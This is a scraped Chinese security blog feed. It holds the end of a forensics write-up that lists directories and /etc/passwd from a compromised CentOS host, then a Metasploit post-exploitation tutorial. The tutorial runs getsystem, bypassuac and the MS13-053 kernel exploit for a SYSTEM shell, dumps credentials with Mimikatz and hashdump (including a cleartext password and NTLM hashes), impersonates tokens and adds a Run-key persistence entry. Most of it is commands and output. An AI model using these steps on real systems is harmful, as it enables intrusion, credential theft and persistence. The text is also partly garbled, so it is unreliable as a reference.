01:00:10 0 0644lost+found 1970-01-01 08:00:00 0 接下来查看/etc/底下的文件夹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228./ 2016-08-09 18:16:11 12288 0755../ 2016-07-16 01:00:10 4096 0555rc4.d/ 2016-08-01 11:01:41 4096 0755pulse/ 2016-07-12 00:01:49 4096 0755skel/ 2016-07-11 23:50:01 4096 0755bash_completion.d/ 2016-07-11 23:55:24 4096 0755samba/ 2016-07-11 23:51:59 4096 0755pango/ 2016-07-11 23:49:07 4096 0755cron.hourly/ 2016-07-11 23:51:58 4096 0755foomatic/ 2016-07-11 23:53:35 4096 0755rwtab.d/ 2013-11-23 05:20:24 4096 0755chkconfig.d/ 2013-09-23 17:07:36 4096 0755obex-data-server/ 2016-07-11 23:49:42 4096 0755wpa_supplicant/ 2016-07-11 23:48:32 4096 0755vmware-tools/ 2016-07-12 00:03:14 4096 0755logrotate.d/ 2016-07-16 02:41:56 4096 0755gnome-vfs-2.0/ 2016-07-11 23:48:27 4096 0755terminfo/ 2010-08-18 23:41:41 4096 0755xdg/ 2016-07-11 23:50:13 4096 0755alternatives/ 2016-07-11 23:52:04 4096 0755hal/ 2016-07-11 23:50:59 4096 0755setuptool.d/ 2016-07-11 23:51:14 4096 0755init.d/ 2016-08-01 11:01:39 4096 0755cups/ 2016-07-11 23:54:38 4096 0755makedev.d/ 2016-07-11 23:47:34 4096 0755ntp/ 2016-07-11 23:51:44 4096 0755abrt/ 2016-07-11 23:48:54 4096 0755pm/ 2016-07-11 23:46:08 4096 0755rc.d/ 2016-07-12 00:03:18 4096 0755httpd/ 2016-07-16 02:12:59 4096 0755gdm/ 2016-07-11 23:51:13 4096 0755gtk-2.0/ 2016-07-11 :50:01 4096 0755ssl/ 2016-07-11 23:47:27 4096 0755libreport/ 2016-07-11 23:48:53 4096 0755gcrypt/ 2013-10-24 23:38:14 4096 0755sound/ 2016-07-11 23:50:01 4096 0755rc1.d/ 2016-08-01 11:01:41 4096 0755yum.repos.d/ 2016-07-11 23:50:16 4096 0755default/ 2016-07-11 23:46:45 4096 0755dracut.conf.d/ 2016-07-12 00:01:52 4096 0755rpm/ 2016-07-16 02:33:57 4096 0755php.d/ 2016-07-16 02:33:56 4096 0755avahi/ 2016-07-11 23:48:23 4096 0755openldap/ 2016-07-11 23:58:43 4096 0755sudoers.d/ 2013-11-22 20:51:12 4096 0750festival/ 2016-07-11 23:50:10 4096 0755kdump-adv-conf/ 2016-07-11 23:54:24 4096 0755rsyslog.d/ 2013-11-22 23:15:59 4096 0755depmod.d/ 2016-07-11 23:48:04 4096 0755PackageKit/ 2016-07-11 23:50:14 4096 0755snmp/ 2016-08-01 11:03:14 4096 0755profile.d/ 2016-07-11 23:54:40 4096 0755dnsmasq.d/ 2013-02-22 12:40:04 4096 0755pam.d/ 2016-07-12 00:00:58 4096 0755rc6.d/ 2016-08-01 11:01:41 4096 0755sgml/ 2016-07-11 23:48:11 4096 0755plymouth/ 2016-07-11 23:50:30 4096 0755cron.weekly/ 2011-09-27 09:33:08 4096 0755sane.d/ 2016-07-11 23:51:40 4096 0755pear/ 2016-05-11 06:42:17 4096 0755ppp/ 2016-07-11 23:50:19 4096 0755event.d/ 2016-07-11 23:48:06 4096 0755popt.d/ 2010-08-21 13:30:56 4096 0755pcmcia/ 2016-07-11 23:52:27 4096 0755rc0.d/ 2016-08-01 11:01:41 4096 0755sysconfig/ 2016-08-01 11:01:39 4096 0755lvm/ 2016-07-11 23:54:01 4096 0755bonobo-activation/ 2016-07-11 23:47:18 4096 0755audisp/ 2016-07-113:54:43 4096 0750opt/ 2011-09-23 19:50:20 4096 0755polkit-1/ 2016-07-11 23:48:05 4096 0755prelink.conf.d/ 2016-07-12 00:00:53 4096 0755gnupg/ 2013-10-24 23:38:54 4096 0755ghostscript/ 2016-07-11 23:49:01 4096 0755ld.so.conf.d/ 2016-07-16 01:49:50 4096 0755rc2.d/ 2016-08-01 11:01:41 4096 0755iproute2/ 2016-07-11 23:50:18 4096 0755udev/ 2016-07-11 23:50:21 4096 0755init/ 2016-07-11 23:54:28 4096 0755cron.daily/ 2016-07-11 23:55:23 4096 0755acpi/ 2016-07-11 23:54:28 4096 0755rc3.d/ 2016-08-01 11:01:41 4096 0755postfix/ 2016-07-11 23:51:54 4096 0755X11/ 2016-07-11 23:51:00 4096 0755ssh/ 2016-07-12 00:00:35 4096 0755cron.monthly/ 2016-07-11 23:54:28 4096 0755blkid/ 2013-11-22 23:29:33 4096 0755security/ 2016-07-11 23:51:58 4096 0755scl/ 2016-07-11 23:55:24 4096 0755alsa/ 2016-07-11 23:52:26 4096 0755gconf/ 2016-07-11 23:48:20 4096 0755statetab.d/ 2013-11-23 05:20:24 4096 0755pkcs11/ 2016-07-11 23:47:16 4096 0755dbus-1/ 2016-07-11 23:47:00 4096 0755sasl2/ 2016-07-11 23:51:54 4096 0755hp/ 2016-07-11 23:51:40 4096 0755pki/ 2016-07-11 23:51:43 4096 0755fonts/ 2016-07-11 23:47:58 4096 0755ConsoleKit/ 2016-07-11 23:48:06 4096 0755xml/ 2016-07-11 23:46:06 4096 0755dhcp/ 2013-11-22 22:30:00 4096 0750rc5.d/ 2016-08-01 11:01:41 4096 0755xinetd.d/ 2016-07-11 23:55:23 4096 0755vmware-caf/ 2016-07-12 00:00:57 4096 0755yum/ 2016-07-11 23:48:52 4096 0755hosts.deny 2010-01-12 21:28:22 460 0644statetab 20131-23 05:20:24 212 0644networks 2013-11-23 05:20:24 58 0644motd 2010-01-12 21:28:22 0 0644ntp.conf 2013-07-15 17:18:47 1778 0644at.deny 2012-01-30 21:56:34 1 0644inputrc 2010-01-12 21:28:22 942 0644pm-utils-hd-apm-restore.conf 2012-07-18 17:04:08 370 0644.pwd.lock 1970-01-01 08:00:00 0libuser.conf 2016-07-11 23:58:43 2290 0644sudo-ldap.conf 2013-10-07 20:51:58 3181 0640mailcap 2009-11-18 05:13:33 272 0644bluetooth 1970-01-01 08:00:00 0selinux 1970-01-01 08:00:00 0mime.types 2011-09-23 23:02:51 43591 0644rc.sysinit 1970-01-01 08:00:00 0hosts.allow 2010-01-12 21:28:22 370 0644magic 2012-10-04 22:51:04 111 0644my.cnf 2016-05-11 14:31:18 251 0644sysctl.conf 2013-11-23 05:20:24 1150 0644crypttab 2016-07-11 23:45:38 0 0644nanorc 2010-11-12 15:18:32 7846 0644man.config 2013-02-22 10:13:09 4940 0644csh.cshrc 2013-10-02 17:06:18 1602 0644yum.conf 2013-02-22 19:26:34 969 0644securetty 2010-01-12 21:28:22 122 0600bashrc 2013-10-02 17:06:18 2681 0644group 2016-07-16 02:31:22 774 0644libaudit.conf 2012-03-02 02:42:34 191 0640pbm2ppa.conf 2010-08-23 07:28:29 1362 0644gshadow 1970-01-01 08:00:00 0protocols 2010-01-12 21:28:22 6455 0644dnsmasq.conf 2013-02-22 12:40:04 21214 0644hosts 2010-01-12 21:28:22 158 0644shadow 1970-01-01 08:00:00 0passwd- 2016-07-11 23:59:08 1435 0644vimrc 2012-02-17 23:17:03 1962 0644quotatab 2013-11-22 19:32:14 259 0644environment 2013-10-02 17:06:18 0 0644portreserve 10-01-01 08:00:00 0anacrontab 2013-11-23 20:43:13 541 0600issue.net 2013-11-27 19:53:33 46 0644centos-release 2013-11-27 19:53:33 27 0644aliases 1970-01-01 08:00:00 0mtab 2016-07-16 01:08:53 444 0644quotagrpadmins 2008-10-14 01:29:19 220 0644sudo.conf 2012-09-25 23:46:01 1786 0640favicon.png 2007-01-25 05:13:36 918 0644exports 2010-01-12 21:28:22 0 0644sestatus.conf 2013-11-23 06:44:51 216 0644printcap 2010-01-12 21:28:22 233 0644rsyslog.conf 1970-01-01 08:00:00 0gshadow- 1970-01-01 08:00:00 0DIR_COLORS.256color 2013-10-17 20:51:45 5139 0644ld.so.conf 2013-07-25 02:50:25 28 0644DIR_COLORS 2013-10-17 20:51:45 4439 0644rc.local 2016-07-11 23:59:08 220 0755system-release-cpe 2013-11-27 19:53:33 25 0644grub.conf 1970-01-01 08:00:00 0localtime 2016-07-11 23:58:41 2819 0644virc 2012-02-17 23:17:03 1962 0644prelink.conf 2013-07-19 22:35:49 789 0644services 2013-10-02 17:06:18 641020 0644kdump.conf 2016-07-11 23:54:24 7786 0644tpvmlp.conf 2016-07-16 01:01:27 1309 0644host.conf 2013-10-02 17:06:18 9 0644ethers 2012-05-10 16:17:31 28 0644issue 2013-11-27 19:53:33 47 0644pinforc 2010-08-21 09:43:26 2872 0644drirc 2013-11-25 20:52:10 1804 0644pnm2ppa.conf 2010-08-23 07:28:29 6300 0644redhat-release 2013-11-27 19:53:33 27 0644dracut.conf 2013-11-26 18:58:48 519 0644updatedb.conf 1970-01-01 08:00:00 0inittab 2016-07-12 00:03:18 884 0644sudoers 2012-03-02 01:18:24 4002 0440odbc.ini 2014-07-10 16::09 0 0644adjtime 1970-01-01 08:00:00 0csh.login 2013-10-02 17:06:18 794 0644group- 2016-07-11 23:59:08 762 0600pear.conf 2016-05-11 06:42:17 946 0644wgetrc 2012-10-10 17:06:54 4479 0644shadow- 1970-01-01 08:00:00 0fstab 2016-07-12 00:03:17 805 0644audit 1970-01-01 08:00:00 0nsswitch.conf 2010-05-05 03:22:21 1688 0644NetworkManager 1970-01-01 08:00:00 0warnquota.conf 2013-11-22 19:32:22 3008 0644login.defs 2016-07-11 23:58:43 1831 0644mke2fs.conf 2009-09-08 05:02:53 801 0644DIR_COLORS.lightbgcolor 2013-10-17 20:51:45 4113 0644prelink.cache 1970-01-01 08:00:00 0passwd.OLD 2016-07-11 23:59:08 1429 0644mtools.conf 2010-08-17 05:28:51 2620 0644readahead.conf 2013-11-23 21:52:17 966 0644fprintd.conf 2013-11-22 22:35:33 20 0644rwtab 2013-11-23 05:20:24 930 0644mail.rc 2013-08-01 17:12:47 1909 0644shadow.bak 2016-07-28 17:40:52 844 0755smartd.conf 2013-02-22 06:26:22 6717 0644odbcinst.ini 2014-07-10 16:15:09 575 0644gai.conf 2013-11-22 05:24:28 0 0644php.ini 2016-05-11 05:42:18 69097 0644crontab 1970-01-01 08:00:00 0ld.so.cache 2016-08-01 11:01:41 53651 0644system-release 2013-11-27 19:53:33 27 0644aliases.db 1970-01-01 08:00:00 0passwd 2016-07-16 02:31:22 1487 0644top.ini 2016-08-10 14:15:01 0 0644modprobe.d 1970-01-01 08:00:00 0enscript.cfg 2010-11-11 14:44:35 4843 0644rpc 2010-05-04 19:27:23 1615 0644cron.deny 2013-11-23 20:43:13 0 0600cron.d 1970-01-01 08:00:00 0shells 2016-07-113:54:44 61 0644profile 2013-10-02 17:06:18 1796 0644asound.conf 2009-05-15 04:53:38 148 0644logrotate.conf 2007-08-29 15:19:36 662 0644filesystems 2013-10-02 17:06:18 64 0644krb5.conf 2013-08-29 01:33:13 449 0644sos.conf 2013-11-23 03:12:07 260 0644rc 1970-01-01 08:00:00 0resolv.conf 2016-07-25 11:57:19 49 0644 接下来查看/etc/shadow这个文件，但是没看到，估计是因为权限不够接下来查看/etc/passwd-获得 12345678910111213141516171819202122232425262728293031|root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrtkit:x:499:497:RealtimeKit:/proc:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinsaslauth:x:498:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinpulse:x:497:496:PulseAudio Syst Daemon:/var/run/pulse:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinsimple:x:500:500:Simple:/home/simple:/bin/bash 接下来/home里面没看到东西。接下来查看/opt/底下得到 123../ 2016-07-16 01:00:10 4096 0555./ 2016-07-12 00:03:18 4096 0755rh/ 2013-11-22 18:16:37 4096 0755 接下来又傻逼的查看/home里面没看到东西。接下来查看/var/里面得到 1234567891011121314151617181920212223db/ 2016-07-11 23:54:42 4096 0755lib/ 2016-07-16 02:31:24 4096 0755lock/ 2016-08-09 18:16:02 4096 0775tmp/ 2016-08-08 09:46:00 4096 1777spool/ 2016-07-11 23:54:43 4096 0755run/ 2016-08-10 00:35:03 4096 0755cache/ 2016-07-16 02:33:57 4096 0755crash/ 2013-11-23 09:15:37 4096 0755gdm/ 2013-11-22 23:54:18 4096 1770preserve/ 2011-09-23 19:50:20 4096 0755account/ 2016-07-11 23:54:44 4096 0755www/ 2016-08-04 10:37:16 4096 0755empty/ 2016-07-11 23:54:25 4096 0755log/ 2016-08-07 18:36:03 4096 0755nis/ 2011-09-23 19:50:20 4096 0755local/ 2011-09-23 19:50:20 4096 0755../ 2016-07-16 01:00:10 4096 0555opt/ 2011-09-23 19:50:20 4096 0755./ 2016-07-22 19:50:16 4096 0755yp 1970-01-01 08:00:00 0abc 1970-01-01 08:00:00 0games 1970-01-01 08:00:00 0mail 1970-01-01 08:00:00 0 接下来查看/var/log/得到 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768ntpstats/ 2013-11-24 02:21:54 4096 0755samba/ 2016-07-11 23:52:01 4096 0700cups/ 2013-08-17 18:21:22 4096 0755httpd/ 2016-08-07 18:36:02 4096 0700gdm/ 2016-07-16 01:01:33 4096 1770sa/ 2016-08-09 15:00:01 4096 0755../ 2016-07-22 19:50:16 4096 0755ppp/ 2010-08-23 07:22:22 4096 0700./ 2016-08-07 18:36:03 4096 0755prelink/ 2016-07-16 02:16:57 4096 0755ConsoleKit/ 2016-07-12 00:03:21 4096 0755vmware-caf/ 2016-07-12 00:01:49 4096 0755secure 2016-08-10 14:10:25 997 0600maillog-20160724 2016-07-22 19:34:03 3589 0600yum.log 2016-08-01 14:59:17 1907 0600anaconda.program.log 2016-07-11 23:59:08 31242 0600pm-powersave.log 2016-07-16 01:01:34 89 0644cron 2016-08-10 14:18:01 360975 0600cron-20160724 2016-07-25 12:43:01 101645 0600wtmp 2016-08-10 14:10:25 51072 0664messages-20160724 2016-07-25 11:57:19 21952 0600Xorg.0.log.old 2016-07-12 00:15:52 50682 0644wpa_supplicant.log 2016-07-12 00:00:29 0 0644anaconda.syslog 2016-07-11 23:59:08 148754 0600anaconda.ifcfg.log 2016-07-11 23:59:08 2657 0600anaconda.storage.log 2016-07-11 23:59:08 109194 0600Xorg.1.log 2016-07-12 00:14:50 50448 0644cron-20160807 2016-08-07 18:36:03 606821 0600spooler-20160807 2016-07-31 18:37:02 0 0600Xorg.0.log 2016-08-09 14:01:46 83699 0644btm2016-08-10 14:06:03 9600 0600anaconda.xlog 2016-07-11 23:59:08 35088 0600boot.log 2016-07-16 01:01:29 2959 0644secure-20160807 2016-08-05 20:01:06 27030 0600messages-20160717 2016-07-16 02:41:58 285781 0600spooler 2016-08-07 18:36:03 0 0600vmware-vmsvc.log 2016-07-25 11:29:49 4779 0644tallylog 2016-07-11 23:47:58 0 0600spice-vdagent.log 2016-07-12 00:00:17 0 0600vmware-vmusr.log 2016-08-03 11:04:06 10063 0644mysqld.log.rpmsave 2016-07-16 02:41:39 1672 0640maillog 2016-08-09 18:16:11 1795 0600dmesg.old 2016-07-11 23:59:43 89000 0644maillog-20160731 2016-07-30 18:32:35 4173 0600spooler-20160717 2016-07-11 23:51:44 0 0600cron-20160717 2016-07-17 18:16:01 35440 0600maillog-20160807 2016-08-06 18:16:04 4195 0600maillog-20160717 2016-07-16 18:22:11 1590 0600spooler-20160724 2016-07-17 18:16:01 0 0600spooler-20160731 2016-07-25 12:43:02 0 0600vmware-tools-upgrader.log 2016-07-12 00:03:18 363533 0644audit 1970-01-01 08:00:00 0anaconda.log 2016-07-11 23:59:08 20411 0600messages-20160731 2016-07-28 10:27:06 1884 0600secure-20160724 2016-07-23 00:21:37 1654 0600lastlog 2016-08-10 14:06:12 146292 0644btmp-20160801 2016-08-01 11:33:21 14976 0600anaconda.yum.log 2016-07-11 23:59:08 99366 0600dmesg 2016-07-16 01:00:10 90056 0644Xorg.2.log 2016-07-12 00:15:24 38224 0644mysqld.log 2016-07-16 02:43:47 1367 0640vmware-install.log 2016-07-12 00:03:18 5359 0644secure-20160717 2016-07-16 03:13:18 7399 0600secur20160731 2016-07-29 17:36:01 8445 0600messages-20160807 2016-08-07 06:04:01 34355 0600cron-20160731 2016-07-31 18:37:01 120163 0600messages 2016-08-10 02:42:01 468 0600dracut.log 2016-07-12 00:03:09 345367 0644 接下来想删除掉/var/log/yum.log，看样子失败了接下来查看/var/empty/,得到 123sshd/ 2013-11-23 06:40:03 4096 0711../ 2016-07-22 19:50:16 4096 0755./ 2016-07-11 23:54:25 4096 0755 接下来，读取/var/log/yum.log的内容，，失败好吧，，又想删除/var/log/yum.log,还是失败","categories":[{"name":"取证","slug":"取证","permalink":"http://www.daikersec.com/categories/取证/"},{"name":"流量分析","slug":"取证/流量分析","permalink":"http://www.daikersec.com/categories/取证/流量分析/"}],"tags":[{"name":"wireshark","slug":"wireshark","permalink":"http://www.daikersec.com/tags/wireshark/"},{"name":"数据分析","slug":"数据分析","permalink":"http://www.daikersec.com/tags/数据分析/"},{"name":"取证","slug":"取证","permalink":"http://www.daikersec.com/tags/取证/"},{"name":"日志分析","slug":"日志分析","permalink":"http://www.daikersec.com/tags/日志分析/"},{"name":"流量分析","slug":"流量分析","permalink":"http://www.daikersec.com/tags/流量分析/"}]},{"title":"metasploit在后渗透中的作用","slug":"metasploit在后渗透中的作用","date":"2018-03-19T05:23:50.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/9668f403.html","link":"","permalink":"http://www.daikersec.com/wiki/9668f403.html","excerpt":"0x00 前言这里简要探究下meterpreter 的使用。meterpreter有个很有效的功能就是，除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。 0x01 权限提升","text":"0x00 前言这里简要探究下meterpreter 的使用。meterpreter有个很有效的功能就是，除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。 0x01 权限提升 getsystem 123456meterpreter &gt; getuidServer username: TEST\\Administratormeterpreter &gt; getsystem...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM bypassuac 12345678meterpreter &gt; background [*] Backgrounding session 1...msf exploit(multi/handler) &gt; use exploit/windows/local/bypassuacmsf exploit(windows/local/bypassuac) &gt; set session 1session =&gt; 1msf exploit(windows/local/bypassuac) &gt; exploit[*] Started reverse TCP handler on 192.168.161.138:4444 利用windows提权漏洞进行提升 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061 meterpreter &gt; background [*] Backgrounding session 1...msf exploit(windows/local/bypassuac_vbs) &gt; use post/windows/gather/enum_patches msf post(windows/gather/enum_patches) &gt; set session 1session =&gt; 1msf post(windows/gather/enum_patches) &gt; exploit[+] KB2871997 is missing[+] KB2928120 is missing[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2[*] KB2778930 applied[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1[*] Post module execution completedmsf post(windows/gather/enum_patches) &gt; search MS13-053Matching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/windows/local/ms13_053_schlamperei 2013-12-01 average Windows NTUserMessageCall Win32k Kernel Pool Overflow (Schlamperei) exploit/windows/local/ppr_flatten_rec 2013-05-15 average Windows EPATHOBJ::pprFlattenRec Local Privilege Escalationmsf post(windows/gather/enum_patches) &gt; use exploit/windows/local/ms13_053_schlampereimsf exploit(windows/local/ms13_053_schlamperei) &gt; show optionsModule options (exploit/windows/local/ms13_053_schlamperei): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on.Exploit target: Id Name -- ---- 0 Windows 7 SP0/SP1msf exploit(windows/local/ms13_053_schlamperei) &gt; msf exploit(windows/local/ms13_053_schlamperei) &gt; set session 1session =&gt; 1msf exploit(windows/local/ms13_053_schlamperei) &gt; exploit[*] Started reverse TCP handler on 192.168.161.138:4444 [*] Launching notepad to host the exploit...[+] Process 2980 launched.[*] Reflectively injecting the exploit DLL into 2980...[*] Injecting exploit into 2980...[*] Found winlogon.exe with PID 432[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell[*] Sending stage (179779 bytes) to 192.168.161.132[*] Meterpreter session 2 opened (192.168.161.138:4444 -&gt; 192.168.161.132:49959) at 2018-03-19 16:56:51 +0800meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM 0x02 域管理员嗅探123456789101112131415161718192021msf exploit(multi/handler) &gt; use post/windows/gather/enum_domainmsf post(windows/gather/enum_domain) &gt; show options Module options (post/windows/gather/enum_domain): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on.msf post(windows/gather/enum_domain) &gt; set session 1session =&gt; 1msf post(windows/gather/enum_domain) &gt; exploit[+] FOUND Domain: test[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)[*] Post module execution completedmsf post(windows/gather/enum_domain) &gt; exploit[+] FOUND Domain: test[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)[*] Post module execution completed 0x03抓取密码1234567891011121314151617181920212223242526272829303132meterpreter &gt; load mimikatz Loading extension mimikatz...Success.meterpreter &gt; help...Mimikatz Commands================= Command Description ------- ----------- kerberos Attempt to retrieve kerberos creds livessp Attempt to retrieve livessp creds mimikatz_command Run a custom command msv Attempt to retrieve msv creds (hashes) ssp Attempt to retrieve ssp creds tspkg Attempt to retrieve tspkg creds wdigest Attempt to retrieve wdigest credsmeterpreter &gt; wdigest [!] Not currently running as SYSTEM[*] Attempting to getprivs[+] Got SeDebugPrivilege[*] Retrieving wdigest credentialswdigest credentials===================AuthID Package Domain User Password------ ------- ------ ---- --------0;997 Negotiate NT AUTHORITY LOCAL SERVICE 0;49485 NTLM 0;293672 Kerberos TEST Administrator TopSec_20170;996 Negotiate TEST TOPSEC$ ba 42 06 75 2b cd 83 7d ea f0 9f 4d 2e a2 03 97 eb de 0d 28 4c 5c 43 6b 64 ee bf 4e 23 75 4c 03 46 93 2c 54 70 e2 4f 0f 8b ef 34 6b 9e f2 de 5a 6f 92 7a 6e 10 0d fe 94 fc 3e 89 02 db 2e a9 ab cd 52 1e 7f 98 20 b8 cf 24 f6 1b f9 a1 b8 9c 10 e7 a4 f1 b3 16 18 5b 5a 15 b2 d3 c2 20 98 f6 b9 36 44 6c 78 39 1a ea bc 35 e6 cc cf c8 94 19 87 34 3e ff 05 b6 bb 91 8b 29 e8 55 0c c6 8d 7a 43 ab de 6d 5e a0 b7 4d 00 6a b8 d3 14 d1 53 2f 02 51 53 14 69 59 b4 9a e8 d2 ae ce 26 23 4e f6 de 6f 83 44 07 59 fa a5 82 c9 ac 57 28 88 97 6b 70 07 22 5c de 1f 8e d4 6e 14 85 62 3e 79 f0 9a f8 07 e7 84 53 ed 03 95 09 0b d4 3f 8a b2 78 e5 2e df b9 ed ff ff bd 57 71 19 74 cb d7 b7 66 fe 16 ee da 0f 8b 57 23 81 79 8b 98 62 48 8f 5d 9d 0c 0;999 Negotiate TEST TOPSEC$ ba 42 06 75 2b cd 83 7d ea f0 9f 4d 2e a2 03 97 eb de 0d 28 4c 5c 43 6b 64 ee bf 4e 23 75 4c 03 46 93 2c 54 70 e2 4f 0f 8b ef 34 6b 9e f2 de 5a 6f 92 7a 6e 10 0d fe 94 fc 3e 89 02 db 2e a9 ab cd 52 1e 7f 98 20 b8 cf 24 f6 1b f9 a1 b8 9c 10 e7 a4 f1 b3 16 18 5b 5a 15 b2 d3 c2 20 98 f6 b9 36 44 6c 78 39 1a ea bc 35 e6 cc cf c8 94 19 87 34 3e ff 05 b6 bb 91 8b 29 e8 55 0c c6 8d 7a 43 ab de 6d 5e a0 b7 4d 00 6a b8 d3 14 d1 53 2f 02 51 53 14 69 59 b4 9a e8 d2 ae ce 26 23 4e f6 de 6f 83 44 07 59 fa a5 82 c9 ac 57 28 88 97 6b 70 07 22 5c de 1f 8e d4 6e 14 85 62 3e 79 f0 9a f8 07 e7 84 53 ed 03 95 09 0b d4 3f 8a b2 78 e5 2e df b9 ed ff ff bd 57 71 19 74 cb d7 b7 66 fe 16 ee da 0f 8b 57 23 81 79 8b 98 62 48 8f 5d 9d 0c 或者123456789101112131415161718msf post(windows/gather/hashdump) &gt; exploit[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 2739ba60d0407daf0d866cb3ee4b6b9f...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...No users with password hints on this system[*] Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:f013ff76154a124f8cfc32f654582420:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[*] Post module execution completed 0x04假冒令牌空格和斜杠注意转译 12345678910111213141516171819202122232425262728293031323334353637383940414243444546meterpreter &gt; use incognitoLoading extension incognito...Success.meterpreter &gt; help...Incognito Commands================== Command Description ------- ----------- add_group_user Attempt to add a user to a global group with all tokens add_localgroup_user Attempt to add a user to a local group with all tokens add_user Attempt to add a user with all tokens impersonate_token Impersonate specified token list_tokens List tokens available under current user context snarf_hashes Snarf challenge/response hashes for every tokenmeterpreter &gt; list_tokens Usage: list_tokens &lt;list_order_option&gt;Lists all accessible tokens and their privilege levelOPTIONS: -g List tokens by unique groupname -u List tokens by unique usernamemeterpreter &gt; list_tokens -uDelegation Tokens Available========================================NT AUTHORITY\\LOCAL SERVICENT AUTHORITY\\NETWORK SERVICENT AUTHORITY\\SYSTEMTEST\\AdministratorImpersonation Tokens Available========================================NT AUTHORITY\\ANONYMOUS LOGONmeterpreter &gt; impersonate_token NT AUTHORITY\\\\SYSTEM[-] User token NT not foundmeterpreter &gt; impersonate_token NT\\ AUTHORITY\\\\SYSTEM[+] Delegation token available[+] Successfully impersonated user NT AUTHORITY\\SYSTEMmeterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM 0X05注册表操作1234567891011121314151617181920212223meterpreter &gt; reg -hUsage: reg [command] [options]Interact with the target machine&apos;s registry.OPTIONS: -d &lt;opt&gt; The data to store in the registry value. -h Help menu. -k &lt;opt&gt; The registry key path (E.g. HKLM\\Software\\Foo). -r &lt;opt&gt; The remote machine name to connect to (with current process credentials -t &lt;opt&gt; The registry value type (E.g. REG_SZ). -v &lt;opt&gt; The registry value name (E.g. Stuff). -w Set KEY_WOW64 flag, valid values [32|64].COMMANDS: enumkey Enumerate the supplied registry key [-k &lt;key&gt;] createkey Create the supplied registry key [-k &lt;key&gt;] deletekey Delete the supplied registry key [-k &lt;key&gt;] queryclass Queries the class of the supplied key [-k &lt;key&gt;] setval Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;] deleteval Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;] queryval Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;] 下面演示通过注册表设置开机自启动 12345678910111213141516171819202122meterpreter &gt; reg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runEnumerating: HKLM\\software\\microsoft\\windows\\currentversion\\run Values (1): VMware User Processmeterpreter &gt; reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v note -d &apos;C:\\Windows\\System32\\notepad.exe&apos;Successfully set note of REG_SZ.meterpreter &gt; reg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runEnumerating: HKLM\\software\\microsoft\\windows\\currentversion\\run Values (2): VMware User Process notemeterpreter &gt; reg queryval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v note Key: HKLM\\software\\microsoft\\windows\\currentversion\\runName: noteType: REG_SZData: C:\\Windows\\System32\\notepad.exe 